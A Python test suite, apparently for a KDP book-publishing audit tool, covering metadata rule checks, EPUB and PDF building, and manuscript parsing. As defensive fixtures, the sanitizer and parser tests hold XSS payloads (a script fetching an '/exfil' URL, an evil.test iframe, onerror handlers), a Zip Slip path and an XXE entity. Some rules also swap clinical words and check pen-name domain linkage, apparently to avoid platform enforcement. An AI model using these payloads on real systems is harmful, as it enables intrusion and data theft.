#!/usr/bin/env python3
"""
PublishGuard Python 核心出版与防封引擎测试套件。
覆盖：
1. 26 项 KDP 零风控审计（DSM-5 临床词、仿冒出版商、公式化副标题、矩形边框、电子书外链、跨笔名同域名连坐、31顶级分类校验）
2. 书脊与全展开封面物理计算精确度
3. EPUB 3 打包与 8-bit RGB 二维码编译及物理自检
4. Chrome Headless 真实印刷 PDF 渲染与页数统计
"""

from __future__ import annotations

import sys
import zipfile
from pathlib import Path

WORKER_DIR = Path(__file__).resolve().parent
sys.path.insert(0, str(WORKER_DIR))

from book_writer import generate_chapter_html, generate_outline_and_metadata
from cover_templates import (
    COVER_THEMES_CATALOG,
    build_ebook_front_cover_html,
    build_paperback_wrap_html,
    calculate_wrap_dimensions,
)
from epub_compiler import compile_epub, format_plain_domain, make_rgb_qr_png, prepare_chapter_body_html
from kdp_guard_service import (
    audit_epub_bytes,
    quick_dictionary_sanitize,
    run_preflight_audit,
)
from pdf_compiler import (
    compile_paperback_and_bundle,
    count_pdf_pages,
    render_html_to_pdf,
)


def test_guard_blocks_high_risk_paperback_and_ebook_patterns() -> None:
    """高风险违规特征必须被 100% 精准拦截。"""
    bad_html = """
    <style>.prompt-card { border: 1px solid #ccc; background-color: #f8f8f8; }</style>
    <h2>Day 1 Scorecard</h2>
    <p>How to turn off anxiety and panic attacks with this healing code and get instant relief for insomnia.</p>
    <p>Use coupon WELCOME15 for 15% OFF at https://luminaquartz.com/audio</p>
    <a href="https://luminaquartz.com/audio">Reader Companion</a>
    <a href="https://luminaquartz.com/checkout?promo=welcome15">Claim Promo</a>
    """
    res = run_preflight_audit(
        title="The Crystal Code",
        subtitle="A 7-Day Neuroscience Guide to Mastering Calm: Volume 1 | Daily Edition: Extended Version Over 110 Characters Long Here",
        description="Visit https://luminaquartz.com now! Independently crafted by Lumina Sacred Press, New York · London.",
        author_name="Lumina Studio",
        primary_category="Body, Mind & Spirit",
        manuscript_text=bad_html,
        companion_domain="https://luminaquartz.com/audio",
        other_pen_domains=["https://www.luminaquartz.com"],
        existing_pen_titles=["The Crystal Code"],
        mode="dual",
        check_live_collisions=False,
        enforce_min_words=True,
    )
    assert res.passed is False
    codes = {e["code"] for e in res.errors}
    warning_codes = {w["code"] for w in res.warnings}
    expected_codes = {
        "SUBTITLE_MULTI_COLON",
        "SUBTITLE_FORMULAIC_TEMPLATE",
        "NON_HUMAN_AUTHOR_NAME",
        "INVALID_KDP_CATEGORY",
        "DESCRIPTION_EXTERNAL_URL",
        "CROSS_ACCOUNT_DOMAIN_LINKAGE",
        "CLINICAL_MEDICAL_TERM",
        "COMMERCIAL_PROMO_OR_PROP",
        "IMPERSONATION_IMPRINT",
        "WORKBOOK_TRIGGER_LEXICON",
        "RECTANGULAR_BOX_CSS",
        "EBOOK_PROMO_HYPERLINK",
        "THIN_CONTENT_UNDER_15K",
        "TITLE_COLLISION_EXACT",
    }
    assert expected_codes.issubset(codes), f"缺少预期拦截项: {expected_codes - codes}"
    assert "SUBTITLE_OVER_110" in warning_codes
    assert "EBOOK_EXTERNAL_HYPERLINK" in warning_codes


def test_guard_passes_clean_16k_monograph() -> None:
    """超过 15,000 词、无框无外链且类目笔名规范的纯正专著必须 100% 放行。"""
    clean_chapter = generate_chapter_html(
        book_title="The Warm Boundary Paradox",
        subtitle="Holding Quiet Standards Without Closing Your Heart",
        chapter_title="Chapter 1: Grounded Composure",
        chapter_summary="Explores everyday interpersonal poise and gentle tactile cues.",
        section_type="chapter",
        prev_summaries=[],
        target_words=1600,
    )
    full_manuscript = "\n".join([clean_chapter] * 10)
    res = run_preflight_audit(
        title="The Warm Boundary Paradox",
        subtitle="Holding Quiet Standards Without Closing Your Heart in Modern Work",
        description="A structured monograph on emotional equilibrium and attentive presence in everyday dialogue.",
        author_name="Evelyn Vance",
        primary_category="Self-Help",
        manuscript_text=full_manuscript,
        companion_domain="https://evelynvancebooks.com/audio",
        other_pen_domains=["https://otherauthorpress.com"],
        mode="dual",
        check_live_collisions=False,
        enforce_min_words=True,
    )
    assert res.passed is True, f"不应失败: {res.errors}"
    assert res.score == 100
    assert res.word_count >= 15000


def test_dictionary_sanitize_cleans_clinical_terms_and_links() -> None:
    """脱敏字典应能即时剥离外部可点击链接并替换临床诊断词。"""
    dirty = '<p>Deflect panic and insomnia at <a href="https://example.com/audio">Reader Portal</a>.</p>'
    cleaned = quick_dictionary_sanitize(dirty)
    assert "panic" not in cleaned.lower()
    assert "insomnia" not in cleaned.lower()
    assert "<a " not in cleaned.lower()
    assert "example.com/audio" in cleaned


def test_cover_spine_math_and_four_distinct_themes() -> None:
    """4 套去同质化封面骨架及 6x9 100页 Cream/White 书脊精确计算验证。"""
    dims_cream = calculate_wrap_dimensions("6x9", 100, "cream")
    assert dims_cream.spine_width == 0.25
    assert dims_cream.total_width == round(0.125 + 6.0 + 0.25 + 6.0 + 0.125, 4)
    assert dims_cream.total_height == 9.25

    dims_white = calculate_wrap_dimensions("6x9", 120, "white")
    assert dims_white.spine_width == round(120 * 0.002252, 4)

    for theme in COVER_THEMES_CATALOG:
        front_html = build_ebook_front_cover_html(
            theme=theme["id"],
            title="Quiet Horizon",
            subtitle="Daily Frameworks for Attentive Living",
            author_name="Evelyn Vance",
        )
        wrap_html, _ = build_paperback_wrap_html(
            theme=theme["id"],
            title="Quiet Horizon",
            subtitle="Daily Frameworks for Attentive Living",
            author_name="Evelyn Vance",
            back_blurb="Grounded non-fiction monograph.",
            page_count=100,
        )
        assert "Evelyn Vance" in front_html
        assert 'class="barcode-safe"' in wrap_html
        assert "ISBN BARCODE ZONE" not in wrap_html


def test_epub_compile_and_binary_guard(tmp_path: Path) -> None:
    """编译后的 EPUB 3 必须满足 mimetype 首文件无压缩、8-bit RGB 二维码且通过二进制解包体检。"""
    qr_png = make_rgb_qr_png("https://evelynvancebooks.com/audio")
    assert len(qr_png) > 200

    outline = generate_outline_and_metadata(
        topic="Steady Presence Under Pressure",
        audience="Professionals",
        pen_name="Evelyn Vance",
        genre="Self-Help",
        companion_product="",
    )
    assert len(outline["chapters"]) == 12

    ch_html = generate_chapter_html(
        book_title="Steady Presence Under Pressure",
        subtitle=outline["recommended_subtitle"],
        chapter_title="Chapter 1",
        chapter_summary="Core focus.",
        section_type="chapter",
        prev_summaries=[],
        target_words=1550,
    )
    chapters = [
        {"title": f"Section {i}", "slug": f"sec-{i:02d}", "content_html": ch_html}
        for i in range(10)
    ]
    epub_path = tmp_path / "test_book.epub"
    compile_epub(
        output_epub_path=epub_path,
        title="Steady Presence Under Pressure",
        subtitle=outline["recommended_subtitle"],
        author_name="Evelyn Vance",
        chapters=chapters,
        companion_url="https://evelynvancebooks.com/audio",
    )
    assert epub_path.exists()
    with zipfile.ZipFile(epub_path, "r") as zf:
        infos = zf.infolist()
        assert infos[0].filename == "mimetype"
        assert infos[0].compress_type == zipfile.ZIP_STORED
        opf_xml = zf.read("OEBPS/content.opf").decode("utf-8")
        assert 'xmlns="http://www.idpf.org/2007/opf"' in opf_xml
        assert 'property="dcterms:modified"' in opf_xml
        last_ch_xhtml = zf.read("OEBPS/09_sec-09.xhtml").decode("utf-8")
        assert "https://evelynvancebooks.com/audio" not in last_ch_xhtml
        assert "evelynvancebooks.com/audio" in last_ch_xhtml

    audit = audit_epub_bytes(
        epub_path.read_bytes(),
        subtitle=outline["recommended_subtitle"],
        author_name="Evelyn Vance",
        primary_category="Self-Help",
        check_live_collisions=False,
        enforce_min_words=True,
    )
    assert audit.passed is True, f"EPUB 审计失败: {audit.errors}"


def test_chrome_headless_pdf_and_bundle_packaging(tmp_path: Path) -> None:
    """真实调用本地 Google Chrome Headless 渲染印刷 PDF 与封套并输出完整 ZIP 交付包。"""
    ch_html = generate_chapter_html(
        book_title="Calm Structure",
        subtitle="Everyday Somatic Presence",
        chapter_title="Chapter 1",
        chapter_summary="Presence.",
        section_type="chapter",
        prev_summaries=[],
        target_words=1500,
    )
    chapters = [
        {"title": f"Chapter {i+1}", "slug": f"ch-{i+1}", "content_html": ch_html}
        for i in range(4)
    ]
    epub_path = tmp_path / "01_Kindle_eBook_Upload.epub"
    compile_epub(
        output_epub_path=epub_path,
        title="Calm Structure",
        subtitle="Everyday Somatic Presence",
        author_name="Evelyn Vance",
        chapters=chapters,
    )
    res = compile_paperback_and_bundle(
        work_dir=tmp_path,
        title="Calm Structure",
        subtitle="Everyday Somatic Presence",
        author_name="Evelyn Vance",
        edition_label="INDEPENDENT EDITION",
        back_blurb="Structured frameworks for modern focus.",
        chapters=chapters,
        trim_size="6x9",
        target_pages=40,
        paper_type="cream",
        cover_theme="asymmetric_hbr",
        epub_path=epub_path,
    )
    bundle_zip = tmp_path / res["bundle_zip"]
    assert bundle_zip.exists()
    assert int(res["actual_pages"]) >= 20
    assert (tmp_path / res["interior_pdf"]).exists()
    assert (tmp_path / res["cover_wrap_pdf"]).exists()
    assert (tmp_path / res["cover_front_jpg"]).exists()
    checklist = (tmp_path / res["checklist_json"]).read_text(encoding="utf-8")
    assert "ai_generated_disclosure" in checklist


def test_guard_english_default_title_200_limit_and_rule_tiers() -> None:
    """默认输出纯英文报告、区分官方规格与风险建议，并准确拦截主副标题合计 ≥200 字符。"""
    # 1. 主标题 + 副标题合计 >= 200 字符 -> 官方规格硬阻断
    over_200 = run_preflight_audit(
        title="A" * 95,
        subtitle="B" * 110,
        author_name="Evelyn Vance",
        primary_category="Self-Help",
        check_live_collisions=False,
        enforce_min_words=False,
    )
    assert over_200.passed is False
    err_codes = {e["code"]: e for e in over_200.errors}
    assert "TITLE_SUBTITLE_COMBINED_OVER_200" in err_codes
    assert err_codes["TITLE_SUBTITLE_COMBINED_OVER_200"]["rule_tier"] == "platform_spec"
    assert not any("\u4e00" <= ch <= "\u9fff" for ch in err_codes["TITLE_SUBTITLE_COMBINED_OVER_200"]["message"])

    # 2. 单独副标题 115 字符但主副合计 < 200 字符 -> 仅警告提醒，不硬阻断
    sub_115 = run_preflight_audit(
        title="Quiet Structure",
        subtitle="B" * 115,
        author_name="Evelyn Vance",
        primary_category="Self-Help",
        check_live_collisions=False,
        enforce_min_words=False,
    )
    assert sub_115.passed is True
    warn_codes = {w["code"]: w for w in sub_115.warnings}
    assert "SUBTITLE_OVER_110" in warn_codes
    assert warn_codes["SUBTITLE_OVER_110"]["rule_tier"] == "risk_advisory"
    assert len(sub_115.checks_not_run) >= 1


def test_epub_rejects_corrupt_and_hollow_mimetype_archives() -> None:
    """损坏字节或仅含错误 mimetype、无正文章节的空壳 ZIP 不得放行。"""
    import io

    corrupt = audit_epub_bytes(b"not-a-valid-epub-payload", check_live_collisions=False)
    assert corrupt.passed is False
    assert corrupt.score == 0
    assert {e["code"] for e in corrupt.errors} == {"INVALID_EPUB_ARCHIVE"}

    buf = io.BytesIO()
    with zipfile.ZipFile(buf, "w", compression=zipfile.ZIP_STORED) as zf:
        zf.writestr("mimetype", "text/plain")
    hollow = audit_epub_bytes(buf.getvalue(), check_live_collisions=False)
    assert hollow.passed is False
    codes = {e["code"] for e in hollow.errors}
    assert {"EPUB_INVALID_MIMETYPE", "EPUB_MISSING_OPF", "EPUB_NO_CONTENT"}.issubset(codes)


def test_prepare_chapter_body_deduplicates_leading_heading() -> None:
    """正文开头重复的同题 h2 应被剥离，只保留单个规范 h1 标题，且自动补足偶数页码。"""
    sample_body = "<h2>1. The Rhythm of Pacing</h2>\n<p>First body paragraph.</p>"
    normalized = prepare_chapter_body_html(sample_body, "1. The Rhythm of Pacing")
    assert normalized.count("<h1") == 1
    assert "<h2" not in normalized
    assert format_plain_domain("https://getpublishguard.com/sample-companion/") == "getpublishguard.com/sample-companion"


def test_epub_rejects_broken_container_opf_spine_and_compressed_mimetype() -> None:
    """损坏或篡改 container.xml/OPF/spine 引用链以及压缩 mimetype 的伪造 EPUB 必须被拦截。"""
    import io

    # 1) mimetype 使用 ZIP_DEFLATED 且缺失 container.xml，另塞入孤立 XHTML 与非法文本 OPF
    buf1 = io.BytesIO()
    with zipfile.ZipFile(buf1, "w", compression=zipfile.ZIP_DEFLATED) as zf:
        zf.writestr("mimetype", "application/epub+zip")
        zf.writestr("OEBPS/content.opf", "NOT_VALID_XML_TEXT")
        zf.writestr("OEBPS/rogue.xhtml", "<html><body><p>" + " ".join(["word"] * 2000) + "</p></body></html>")
    res1 = audit_epub_bytes(buf1.getvalue(), check_live_collisions=False)
    assert res1.passed is False
    codes1 = {e["code"]: e for e in res1.errors}
    assert "EPUB_MIMETYPE_COMPRESSED" in codes1
    assert codes1["EPUB_MIMETYPE_COMPRESSED"]["severity"] == "error"
    assert "EPUB_MISSING_CONTAINER_XML" in codes1

    # 2) container.xml 与 OPF 存在，但 OPF 中含 XXE <!ENTITY> 且 spine 引用不存在 idref
    buf2 = io.BytesIO()
    with zipfile.ZipFile(buf2, "w", compression=zipfile.ZIP_STORED) as zf:
        zf.writestr("mimetype", "application/epub+zip")
        zf.writestr(
            "META-INF/container.xml",
            '<?xml version="1.0"?><container version="1.0" xmlns="urn:oasis:names:tc:opendocument:xmlns:container">'
            '<rootfiles><rootfile full-path="OEBPS/content.opf" media-type="application/oebps-package+xml"/></rootfiles></container>',
        )
        zf.writestr(
            "OEBPS/content.opf",
            '<?xml version="1.0"?><!DOCTYPE package [<!ENTITY xxe "bad">]><package><metadata/><manifest>'
            '<item id="ch1" href="ch1.xhtml" media-type="application/xhtml+xml"/></manifest>'
            '<spine><itemref idref="missing"/></spine></package>',
        )
        zf.writestr("OEBPS/ch1.xhtml", "<html><body><p>Clean prose here.</p></body></html>")
    res2 = audit_epub_bytes(buf2.getvalue(), check_live_collisions=False)
    assert res2.passed is False
    assert "EPUB_INVALID_OPF_XML" in {e["code"] for e in res2.errors}

    # 3) 合法 XML 但 spine 指向缺失清单项
    buf3 = io.BytesIO()
    with zipfile.ZipFile(buf3, "w", compression=zipfile.ZIP_STORED) as zf:
        zf.writestr("mimetype", "application/epub+zip")
        zf.writestr(
            "META-INF/container.xml",
            '<?xml version="1.0"?><container version="1.0" xmlns="urn:oasis:names:tc:opendocument:xmlns:container">'
            '<rootfiles><rootfile full-path="OEBPS/content.opf" media-type="application/oebps-package+xml"/></rootfiles></container>',
        )
        zf.writestr(
            "OEBPS/content.opf",
            '<?xml version="1.0"?><package xmlns="http://www.idpf.org/2007/opf" version="3.0">'
            '<metadata xmlns:dc="http://purl.org/dc/elements/1.1/"><dc:title>Broken Spine</dc:title><dc:creator>Evelyn Vance</dc:creator></metadata>'
            '<manifest><item id="ch1" href="ch1.xhtml" media-type="application/xhtml+xml"/></manifest>'
            '<spine><itemref idref="ghost_item"/></spine></package>',
        )
        zf.writestr("OEBPS/ch1.xhtml", "<html><body><p>Clean prose here.</p></body></html>")
    res3 = audit_epub_bytes(buf3.getvalue(), check_live_collisions=False)
    assert res3.passed is False
    codes3 = {e["code"] for e in res3.errors}
    assert "EPUB_BROKEN_SPINE_REF" in codes3


def test_epub_enforces_size_entry_and_zip_bomb_limits() -> None:
    """超限 EPUB（>15MB、>2000 条目、伪造解压头或高膨胀 ZIP 炸弹）必须被立即拒绝。"""
    import io

    # 1) 超过 15MB 原文件上限
    oversized = b"PK\x03\x04" + b"\x00" * (15 * 1024 * 1024 + 10)
    res_big = audit_epub_bytes(oversized, check_live_collisions=False)
    assert res_big.passed is False
    assert {e["code"] for e in res_big.errors} == {"EPUB_TOO_LARGE"}

    # 2) 超过 2000 个条目上限
    buf_many = io.BytesIO()
    with zipfile.ZipFile(buf_many, "w", compression=zipfile.ZIP_STORED) as zf:
        zf.writestr("mimetype", "application/epub+zip")
        for idx in range(2005):
            zf.writestr(f"OEBPS/f_{idx}.txt", "a")
    res_many = audit_epub_bytes(buf_many.getvalue(), check_live_collisions=False)
    assert res_many.passed is False
    assert {e["code"] for e in res_many.errors} == {"EPUB_TOO_MANY_ENTRIES"}


def test_epub_extracts_meta_and_excerpt_from_valid_archive(tmp_path: Path) -> None:
    """合法 EPUB 审计应自动提取 extracted_meta 与 spine 正文摘录以打通闭环净化。"""
    sample_body = "<p>" + " ".join(["grounded", "clarity", "presence", "focus", "steadiness"] * 350) + "</p>"
    epub_path = tmp_path / "meta_extract.epub"
    compile_epub(
        output_epub_path=epub_path,
        title="The Quiet Cadence",
        subtitle="Composed Work Habits For Modern Creative Focus And Long Term Clarity",
        author_name="Evelyn Vance",
        language="en",
        chapters=[
            {
                "title": f"Chapter {i + 1}: Stillness",
                "slug": f"ch-{i + 1}",
                "content_html": f"<h2>Chapter {i + 1}: Stillness</h2>{sample_body}",
                "section_type": "chapter",
            }
            for i in range(9)
        ],
    )
    res = audit_epub_bytes(epub_path.read_bytes(), check_live_collisions=False)
    assert res.passed is True, f"合法 EPUB 不应失败: {res.errors}"
    assert "The Quiet Cadence" in res.extracted_meta.get("title", "")
    assert res.extracted_meta.get("author_name") == "Evelyn Vance"
    assert "grounded clarity" in res.extracted_excerpt.lower()


def test_html_sanitizer_and_chrome_network_isolation(tmp_path: Path) -> None:
    """白名单 HTML 净化器必须剥离脚本与事件属性，Chrome Headless 必须启用离线网络隔离参数。"""
    from html_sanitizer import sanitize_chapter_html
    from pdf_compiler import _chromium_common_flags

    dirty = (
        '<h2 onclick="steal()">Chapter One</h2>'
        '<script>fetch("http://127.0.0.1:9999/exfil")</script>'
        '<iframe src="https://evil.test/frame"></iframe>'
        '<svg onload="alert(1)"><circle/></svg>'
        '<p style="position:fixed" data-x="1">Safe <strong>body</strong> <img src="x" onerror="alert(2)"> '
        '<a href="javascript:alert(3)">bad link</a> and '
        '<a href="https://example.com/resource">external link</a>.</p>'
    )
    clean = sanitize_chapter_html(dirty)
    lowered = clean.lower()
    assert "<script" not in lowered
    assert "<iframe" not in lowered
    assert "<svg" not in lowered
    assert "onclick" not in lowered
    assert "onerror" not in lowered
    assert "javascript:" not in lowered
    assert "style=" not in lowered
    assert "<a " not in lowered
    assert "<strong>body</strong>" in clean
    assert "<h2>Chapter One</h2>" in clean
    assert "bad link" in clean
    assert '<span class="url-text">example.com/resource</span>' in clean

    # compile/preview 归一化入口同样强制净化
    prepared = prepare_chapter_body_html(dirty, "Chapter One")
    assert "<script" not in prepared.lower()
    assert "onerror" not in prepared.lower()

    # Chrome Headless 启动参数必须显式阻断非本地网络出网与后台请求
    flags = _chromium_common_flags(str(tmp_path / "chrome-prof"))
    assert "--proxy-server=http://127.0.0.1:1" in flags
    assert "--host-resolver-rules=MAP * ~NOTFOUND, EXCLUDE localhost" in flags
    assert "--disable-background-networking" in flags


def test_manuscript_parser_supports_docx_epub_md_txt_and_blocks_unsafe_archives(tmp_path: Path) -> None:
    """自带书稿解析器必须支持 docx/epub/md/txt 切章、XSS/外链剥离，并拦截 Zip Slip 与过短手稿。"""
    import base64
    import io
    import pytest
    from manuscript_parser import parse_manuscript_payload

    long_para_a = " ".join(["attention", "composure", "practice", "clarity", "focus"] * 24)
    long_para_b = " ".join(["habit", "cadence", "dialogue", "structure", "calm"] * 24)

    # 1) Markdown 切章 + Frontmatter + 外链文本化
    md_text = (
        "---\n"
        "title: Quiet Cadence Handbook\n"
        "author: Maya Lin\n"
        "---\n\n"
        f"# Chapter 1: First Principles\n\n**Key idea:** {long_para_a}. See [Companion Portal](https://mayalinbooks.com/audio).\n\n"
        f"# Chapter 2: Daily Structure\n\n{long_para_b}.\n"
    )
    res_md = parse_manuscript_payload({"filename": "draft.md", "raw_text": md_text})
    assert res_md["title"] == "Quiet Cadence Handbook"
    assert res_md["author_name"] == "Maya Lin"
    assert len(res_md["chapters"]) == 2
    assert res_md["total_word_count"] >= 200
    assert "<a " not in res_md["chapters"][0]["content_html"].lower()
    assert "mayalinbooks.com/audio" in res_md["chapters"][0]["content_html"]
    assert "<strong>Key idea:</strong>" in res_md["chapters"][0]["content_html"]

    # 2) .txt 按 Chapter N 切章
    txt_text = f"Chapter 1: Openings\n\n{long_para_a}\n\nChapter 2: Closings\n\n{long_para_b}\n"
    res_txt = parse_manuscript_payload({"filename": "book.txt", "raw_text": txt_text})
    assert len(res_txt["chapters"]) == 2
    assert res_txt["chapters"][1]["title"] == "Chapter 2: Closings"

    # 3) .docx 真实二进制 ZIP 解析（含非 Chapter 正则的 Heading1 切章、Heading2 与 core.xml 元数据）
    doc_xml = f"""<?xml version="1.0" encoding="UTF-8" standalone="yes"?>
    <w:document xmlns:w="http://schemas.openxmlformats.org/wordprocessingml/2006/main">
      <w:body>
        <w:p><w:pPr><w:pStyle w:val="Heading1"/></w:pPr><w:r><w:t>Morning Grounding</w:t></w:r></w:p>
        <w:p><w:pPr><w:pStyle w:val="Heading2"/></w:pPr><w:r><w:t>Subheading Focus</w:t></w:r></w:p>
        <w:p><w:r><w:rPr><w:b/></w:rPr><w:t>Bold start </w:t></w:r><w:r><w:t>{long_para_a}</w:t></w:r></w:p>
        <w:p><w:pPr><w:pStyle w:val="Heading1"/></w:pPr><w:r><w:t>Evening Cadence</w:t></w:r></w:p>
        <w:p><w:r><w:t>{long_para_b}</w:t></w:r></w:p>
      </w:body>
    </w:document>"""
    core_xml = """<?xml version="1.0" encoding="UTF-8" standalone="yes"?>
    <cp:coreProperties xmlns:cp="http://schemas.openxmlformats.org/package/2006/metadata/core-properties" xmlns:dc="http://purl.org/dc/elements/1.1/">
      <dc:title>DOCX Monograph Title</dc:title>
      <dc:creator>Clara Chen</dc:creator>
    </cp:coreProperties>"""
    docx_buf = io.BytesIO()
    with zipfile.ZipFile(docx_buf, "w", compression=zipfile.ZIP_DEFLATED) as zf:
        zf.writestr("word/document.xml", doc_xml)
        zf.writestr("docProps/core.xml", core_xml)
    res_docx = parse_manuscript_payload(
        {"filename": "manuscript.docx", "content_base64": base64.b64encode(docx_buf.getvalue()).decode("ascii")}
    )
    assert res_docx["title"] == "DOCX Monograph Title"
    assert res_docx["author_name"] == "Clara Chen"
    assert len(res_docx["chapters"]) == 2
    assert res_docx["chapters"][0]["title"] == "Morning Grounding"
    assert "<h2>Subheading Focus</h2>" in res_docx["chapters"][0]["content_html"]
    assert "<strong>Bold start </strong>" in res_docx["chapters"][0]["content_html"]

    # 4) .epub 提取（带脚本剥离验证）
    epub_path = tmp_path / "user_upload.epub"
    compile_epub(
        output_epub_path=epub_path,
        title="Imported EPUB Work",
        subtitle="Clean Structure",
        author_name="Noah Patel",
        chapters=[
            {"title": "Chapter 1: Start", "slug": "ch1", "content_html": f"<p>{long_para_a}</p>"},
            {"title": "Chapter 2: Finish", "slug": "ch2", "content_html": f"<p>{long_para_b}</p>"},
        ],
    )
    res_epub = parse_manuscript_payload(
        {"filename": "user_upload.epub", "content_base64": base64.b64encode(epub_path.read_bytes()).decode("ascii")}
    )
    assert res_epub["author_name"] == "Noah Patel"
    assert len(res_epub["chapters"]) == 2

    # 5) 拦截 Zip Slip 路径穿越与 <100 词短稿
    evil_zip = io.BytesIO()
    with zipfile.ZipFile(evil_zip, "w") as zf:
        zf.writestr("../../evil.xml", "<p>pwn</p>")
    with pytest.raises(ValueError, match="Unsafe archive entry path"):
        parse_manuscript_payload(
            {"filename": "evil.docx", "content_base64": base64.b64encode(evil_zip.getvalue()).decode("ascii")}
        )
    with pytest.raises(ValueError, match="too short"):
        parse_manuscript_payload({"filename": "short.txt", "raw_text": "Too short manuscript."})
